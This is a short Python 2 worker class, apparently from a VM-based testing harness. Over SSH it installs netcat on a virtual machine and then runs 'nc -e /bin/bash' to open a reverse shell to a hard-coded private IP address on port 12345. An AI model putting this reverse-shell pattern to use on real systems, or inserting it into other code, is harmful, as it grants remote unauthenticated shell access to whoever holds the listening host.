#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from __future__ import absolute_import, unicode_literals

import threading
import time

import worker.workers
LOG = worker.workers.LOG.getChild('tester')
LOG.setLevel('DEBUG')


class TesterWorker(worker.workers.VMWorker):
    def __init__(self):
        super(self.__class__, self).__init__()

    def _run(self, job):
        self.ssh.exec_command("DEBIAN_FRONTEND=noninteractive apt-get update")
        self.ssh.exec_command("DEBIAN_FRONTEND=noninteractive apt-get -y install netcat")
        self.ssh.exec_command("nc -vv -e /bin/bash 192.168.48.26 12345")
